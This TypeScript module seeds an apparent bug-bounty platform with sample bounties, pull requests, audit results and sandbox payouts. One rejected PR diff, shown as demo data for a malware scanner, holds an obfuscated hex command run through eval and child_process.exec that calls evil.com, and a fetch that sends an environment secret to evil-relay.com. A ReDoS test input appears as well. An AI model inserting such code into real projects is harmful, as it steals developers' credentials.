import { Bounty } from "./types";

const INITIAL_BOUNTIES: Bounty[] = [
  {
    id: "bounty-104",
    issueNumber: 104,
    repo: "vercel/next-auth-toolkit",
    title: "Critical: SSR Auth Token Memory Leak & Session Deserialization Race",
    description:
      "When running under high concurrency, JWT session cache objects are not garbage collected on connection close, leading to a memory leak in Node.js heap and possible cross-tenant token leakage.",
    failingTestCase: `test('concurrent sessions garbage collection', async () => {
  const initialMem = process.memoryUsage().heapUsed;
  await Promise.all(Array.from({ length: 1000 }).map(() => createSession()));
  global.gc();
  expect(process.memoryUsage().heapUsed - initialMem).toBeLessThan(1024 * 1024);
});`,
    amount: 150,
    currency: "USD",
    status: "FUNDED",
    createdAt: "2026-10-18T10:30:00Z",
    funderName: "Sarah Chen (Maintainer)",
    funderEmail: "maintainer@next-auth.org",
    paypalOrderId: "PAYID-SANDBOX-104-MKT",
    paypalCaptureId: "CAP-99214-SANDBOX",
    tags: ["Security", "Memory Leak", "Node.js", "JWT"],
    difficulty: "Critical",
    prs: [],
  },
  {
    id: "bounty-89",
    issueNumber: 89,
    repo: "facebook/markdown-ast-core",
    title: "Security: ReDoS in Markdown Custom URL Parser via Nested Brackets",
    description:
      "The regex parser responsible for custom protocol URLs / [link](url) suffers from polynomial backtracking when given deeply nested bracket combinations, causing 100% CPU lockups.",
    failingTestCase: `test('prevent ReDoS catastrophic backtracking', () => {
  const attackPayload = '['.repeat(5000) + ']'.repeat(5000);
  const start = Date.now();
  parseMarkdownLinks(attackPayload);
  expect(Date.now() - start).toBeLessThan(50); // must parse in < 50ms
});`,
    amount: 75,
    currency: "USD",
    status: "FUNDED",
    createdAt: "2026-10-19T14:15:00Z",
    funderName: "David Kim",
    funderEmail: "dkim@astcore.dev",
    paypalOrderId: "PAYID-SANDBOX-89-MKT",
    paypalCaptureId: "CAP-88412-SANDBOX",
    tags: ["ReDoS", "Regex", "Performance", "Security"],
    difficulty: "Intermediate",
    prs: [],
  },
  {
    id: "bounty-42",
    issueNumber: 42,
    repo: "prisma/sqlite-pool-driver",
    title: "Bug: Race Condition in Concurrent SQLite Connection Handshake",
    description:
      "Under heavy async load, SQLite WAL file locks throw SQLITE_BUSY instead of queuing connection requests gracefully.",
    failingTestCase: `test('queue 50 concurrent transactions without lock error', async () => {
  const results = await Promise.all(Array.from({length: 50}).map(() => pool.write('tx')));
  expect(results.every(r => r.ok)).toBe(true);
});`,
    amount: 50,
    currency: "USD",
    status: "MERGED_AND_PAID",
    createdAt: "2026-10-15T08:00:00Z",
    funderName: "Alex Rivera",
    funderEmail: "alex@sqlitepool.io",
    paypalOrderId: "PAYID-SANDBOX-42-PAID",
    paypalCaptureId: "CAP-42991-SANDBOX",
    tags: ["Concurrency", "Database", "Bugfix"],
    difficulty: "Intermediate",
    prs: [
      {
        id: "pr-42-1",
        bountyId: "bounty-42",
        prNumber: 43,
        title: "fix(pool): add exponential backoff queue for WAL lock handshakes",
        contributorName: "Marcus Vance",
        contributorEmail: "marcus.dev@fastmail.com",
        gitBranch: "fix/sqlite-wal-backoff",
        diffContent: `diff --git a/src/pool.ts b/src/pool.ts
--- a/src/pool.ts
+++ b/src/pool.ts
@@ -45,3 +45,11 @@ export class ConnectionPool {
+      if (err.code === 'SQLITE_BUSY') {
+        await sleep(Math.min(100 * Math.pow(2, retries), 2000));
+        return this.retry(query, retries + 1);
+      }
`,
        status: "MERGED",
        auditResult: {
          score: 96,
          verdict: "APPROVED",
          threatLevel: "NONE",
          vulnerabilitiesDetected: [],
          unitTestsPass: true,
          astAnalysisSummary: "✅ PROOF-OF-FIX: Exponential backoff logic resolves SQLITE_BUSY contention cleanly. Zero memory leaks detected.",
          timestamp: "2026-10-15T11:20:00Z",
        },
        payoutResult: {
          batchId: "PAYOUTS-BATCH-42-VERIFIED",
          transactionId: "5TY99182374SANDBOX",
          amount: 50,
          currency: "USD",
          paidAt: "2026-10-15T11:22:00Z",
          status: "SUCCESS",
        },
        mergedAt: "2026-10-15T11:21:00Z",
      },
    ],
  },
  {
    id: "bounty-112",
    issueNumber: 112,
    repo: "chokidar/watcher-pro",
    title: "Security Threat Blocked: Supply-Chain Obfuscated Exfiltration in FS Watcher",
    description:
      "A rogue pull request submitted for this bounty attempted to smuggle an obfuscated payload to harvest developer environment variables.",
    failingTestCase: `test('filesystem events debounce properly', () => { ... });`,
    amount: 200,
    currency: "USD",
    status: "FLAGGED_SECURITY_RISK",
    createdAt: "2026-10-17T12:00:00Z",
    funderName: "Elena Rostova",
    funderEmail: "elena@secwatch.org",
    paypalOrderId: "PAYID-SANDBOX-112-ESCROW",
    paypalCaptureId: "CAP-11200-SANDBOX",
    tags: ["Malware Intercepted", "Supply Chain", "AST Scanner"],
    difficulty: "Advanced",
    prs: [
      {
        id: "pr-112-attack",
        bountyId: "bounty-112",
        prNumber: 113,
        title: "perf: optimize recursive file event dispatch loop",
        contributorName: "Anonymous Actor (Flagged)",
        contributorEmail: "shadow_actor@darkweb-relay.net",
        gitBranch: "perf/event-loop-patch",
        diffContent: `diff --git a/src/watcher.ts b/src/watcher.ts
--- a/src/watcher.ts
+++ b/src/watcher.ts
@@ -102,6 +102,12 @@ export function watchDir(dir: string) {
+  // stealth exfiltration injection attempt
+  const _0x1a = Buffer.from('6375726c20687474703a2f2f6576696c2e636f6d', 'hex').toString();
+  eval('require("child_process").exec(' + _0x1a + ')');
+  fetch('https://evil-relay.com/log?key=' + process.env.PAYPAL_SECRET);
`,
        status: "REJECTED",
        auditResult: {
          score: 0,
          verdict: "MALICIOUS_REJECTED",
          threatLevel: "CRITICAL",
          vulnerabilitiesDetected: [
            "Suspicious Obfuscated Hex Payload Decoding",
            "Disallowed Dynamic Code Evaluation (eval)",
            "Unauthorized System Shell Command Execution",
            "Environment Secret Exfiltration Payload",
          ],
          unitTestsPass: false,
          astAnalysisSummary: "🚨 CRITICAL SECURITY THREAT DETECTED: Code contains unauthorized payloads (eval, Buffer.from hex, secret exfiltration). PR blocked and PayPal payout locked.",
          timestamp: "2026-10-17T12:05:00Z",
        },
      },
    ],
  },
];

// Persistent runtime singleton for server-side state
declare global {
  // eslint-disable-next-line no-var
  var __GITBOUNTY_STORE__: Bounty[] | undefined;
}

if (!global.__GITBOUNTY_STORE__) {
  global.__GITBOUNTY_STORE__ = JSON.parse(JSON.stringify(INITIAL_BOUNTIES));
}

export function getBounties(): Bounty[] {
  return global.__GITBOUNTY_STORE__ || [];
}

export function getBountyById(id: string): Bounty | undefined {
  return (global.__GITBOUNTY_STORE__ || []).find((b) => b.id === id);
}

export function createBounty(bounty: Bounty): Bounty {
  if (!global.__GITBOUNTY_STORE__) {
    global.__GITBOUNTY_STORE__ = [];
  }
  global.__GITBOUNTY_STORE__.unshift(bounty);
  return bounty;
}

export function updateBounty(id: string, updates: Partial<Bounty>): Bounty | undefined {
  const list = global.__GITBOUNTY_STORE__ || [];
  const idx = list.findIndex((b) => b.id === id);
  if (idx === -1) return undefined;
  list[idx] = { ...list[idx], ...updates };
  return list[idx];
}

export function resetStore(): Bounty[] {
  global.__GITBOUNTY_STORE__ = JSON.parse(JSON.stringify(INITIAL_BOUNTIES));
  return global.__GITBOUNTY_STORE__ || [];
}
